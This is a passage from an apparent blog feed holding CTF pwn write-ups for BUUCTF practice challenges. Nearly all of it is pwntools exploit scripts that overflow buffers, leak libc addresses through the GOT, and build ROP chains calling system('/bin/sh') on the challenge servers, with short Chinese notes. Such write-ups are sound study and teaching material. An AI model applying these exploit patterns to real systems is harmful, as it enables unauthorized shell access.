class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">29937</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./babyrop2&#x27;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./babyrop2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x400733</span></span><br><span class="line">ret = <span class="number">0x4004d1</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(rdi)+p64(e.got[<span class="string">&#x27;read&#x27;</span>]) + \</span><br><span class="line">    p64(ret)+p64(e.plt[<span class="string">&#x27;printf&#x27;</span>])+p64(ret) + \</span><br><span class="line">    p64(e.sym[<span class="string">&#x27;main&#x27;</span>])  <span class="comment"># 远程printf地址打印不出来,原因未知，所以这里打印了read的地址</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;name? &#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="built_in">hex</span>(read_addr))</span><br><span class="line">libc_base = read_addr - <span class="number">0xf7250</span></span><br><span class="line">system = libc_base + <span class="number">0x45390</span></span><br><span class="line">binsh = libc_base + <span class="number">0x18cd57</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;name? &#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">28165</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Correct\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = e.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got = e.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048825</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt) + \</span><br><span class="line">    p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">write_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh_addr = libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Correct\n&quot;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh_addr)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">25755</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./2018_rop&#x27;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(e.plt[<span class="string">&#x27;write&#x27;</span>]) + \</span><br><span class="line">    p32(e.sym[<span class="string">&#x27;vulnerable_function&#x27;</span>])+p32(<span class="number">1</span>)+p32(e.got[<span class="string">&#x27;write&#x27;</span>])+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="comment"># r.recv(16)</span></span><br><span class="line">write_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write_addr:&#x27;</span>, <span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(e.plt[<span class="string">&#x27;write&#x27;</span>]) + \</span><br><span class="line">    p32(e.sym[<span class="string">&#x27;vulnerable_function&#x27;</span>])+p32(<span class="number">1</span>)+p32(e.got[<span class="string">&#x27;read&#x27;</span>])+p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">read_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;read_addr:&#x27;</span>, <span class="built_in">hex</span>(read_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.27_1</span></span><br><span class="line">libc_base = write_addr-<span class="number">0xe56f0</span></span><br><span class="line">system = libc_base+<span class="number">0x3cd10</span></span><br><span class="line">binsh = libc_base+<span class="number">0x17b8cf</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system)+p32(<span class="number">0</span>)+p32(binsh)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h3><p>泄露两次地址是为了确定libc版本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">26876</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./bjdctf_2020_babystack2&#x27;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./bjdctf_2020_babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x400733</span></span><br><span class="line">ret = <span class="number">0x4004c9</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + \</span><br><span class="line">    p64(rdi)+p64(e.got[<span class="string">&#x27;puts&#x27;</span>])+p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;story!&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">libc_puts = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;libc_puts: &#x27;</span>+<span class="built_in">hex</span>(libc_puts))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + \</span><br><span class="line">    p64(rdi)+p64(e.got[<span class="string">&#x27;read&#x27;</span>])+p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;story!&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">libc_read = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;libc_read: &#x27;</span>+<span class="built_in">hex</span>(libc_read))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.23_11</span></span><br><span class="line">libc_base = libc_puts-<span class="number">0x6f690</span></span><br><span class="line">system = libc_base+<span class="number">0x45390</span></span><br><span class="line">binsh = libc_base+<span class="number">0x18cd57</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;story!&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r = process(&#x27;./bjdctf_2020_babystack&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">28581</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x400561</span></span><br><span class="line">backdoor = <span class="number">0x4006E6</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;name:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;256&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;u name?&#x27;</span>)</span><br><span class="line">r.sendline(p64(<span class="number">1</span>)*<span class="number">3</span>+p64(ret)+p64(backdoor))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h3><p>整数溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27500</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./bjdctf_2020_babystack2&#x27;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./bjdctf_2020_babystack2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x400726</span></span><br><span class="line">ret = <span class="number">0x400599</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(ret)+p64(backdoor)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;your name:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;name?&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h3><p>这题有几个需要注意的地方。一个是<code>fgets</code>函数遇到回车会截断，但是遇到\x00不会截断，但是\x00可以用来截断memcmp。另一个是要注意memcpy的参数，被复制的起始点是s的指针，而非s本身，所以要动调查看实际需要多少垃圾数据，具体是&amp;s &#x3D; s-0x1C。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">25408</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./ez_pz_hackover_2016&#x27;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./ez_pz_hackover_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;crashme\x00&#x27;</span>  <span class="comment"># fgets遇到回车会截断，但是\x00不会</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x36</span>-<span class="number">0x1C</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p32(e.plt[<span class="string">&#x27;printf&#x27;</span>])+p32(e.symbols[<span class="string">&#x27;main&#x27;</span>])+p32(e.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b* 0x80486D7&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r.sendline(payload)  <span class="comment"># 注意memcpy的起始点是&amp;s，而非s本身，所以需要动调看偏移</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;crashme!\n&#x27;</span>)</span><br><span class="line">printf_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>, printf_addr)</span><br><span class="line">libc_base = printf_addr-libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system = libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;crashme\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x36</span>-<span class="number">0x1C</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p32(system)+p32(<span class="number">0</span>)+p32(binsh)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h3><p>看注释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)  <span class="comment"># 32位</span></span><br><span class="line"><span class="comment"># r = remote(&#x27;node5.buuoj.cn&#x27;, 27438)</span></span><br><span class="line"></span><br><span class="line">get_flag = <span class="number">0x80489A0</span></span><br><span class="line">exit = <span class="number">0x0804E6A0</span>  <span class="comment"># getflag后必须返回到exit，不然输出会待在缓冲区里不出来</span></span><br><span class="line"><span class="comment"># 还有一个鬼畜的地方是，他压根就没push ebp，也就是说没有ebp，不用在b&#x27;a&#x27;那+4，直接就是返回地址</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>+p32(get_flag)+p32(exit) + p32(<span class="number">0x308CD64F</span>)+p32(<span class="number">0x195719D1</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">29720</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./not_the_same_3dsctf_2016&#x27;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)  <span class="comment"># 没有ebp</span></span><br><span class="line"></span><br><span class="line">flag_str = <span class="number">0x80BC2A8</span></span><br><span class="line">flag_store = <span class="number">0x80ECA2D</span></span><br><span class="line">write = e.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">secret = <span class="number">0x80489A0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(secret)+p32(write)+<span class="string">b&#x27;dead&#x27;</span> + \</span><br><span class="line">    p32(<span class="number">1</span>)+p32(flag_store)+p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r.recvuntil(b&#x27;m3m0...&#x27;) 不知道为什么脚本接收不到，实际上会打印出来的</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h3><p>nc即可</p><h3 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a>picoctf_2018_rop chain</h3><p>这题可以用来熟悉32位传参规则及其rop链的传参。现在接触的32位少了，做的时候还调试了一会才做出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27584</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./PicoCTF_2018_rop_chain&#x27;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./PicoCTF_2018_rop_chain&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)</span><br><span class="line">payload += p32(e.sym[<span class="string">&#x27;win_function1&#x27;</span>]) + \</span><br><span class="line">    p32(e.sym[<span class="string">&#x27;win_function2&#x27;</span>])+p32(e.sym[<span class="string">&#x27;flag&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">0xBAAAAAAD</span>)+p32(<span class="number">0xDEADBAAD</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;input&gt; &#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h3><p>整数溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">28838</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn2_sctf_2016&#x27;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn2_sctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p32(e.plt[<span class="string">&#x27;printf&#x27;</span>]) + \</span><br><span class="line">    p32(e.symbols[<span class="string">&#x27;vuln&#x27;</span>])+p32(e.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;read? &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;data!\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(p32(e.got[<span class="string">&#x27;printf&#x27;</span>])+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">printf = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&#x27;printf: &#x27;</span>+<span class="built_in">hex</span>(printf))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 9: ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>, printf)</span><br><span class="line">libc_base = printf - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p32(system)+p32(binsh)+p32(binsh)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;read? &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;data!\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> WP </tag>
            
            <tag> BUU </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『glibc源码补完计划』exit_hook</title>
      <link href="/2024/glibc-exit-hook/"/>
      <url>/2024/glibc-exit-hook/</url>
      
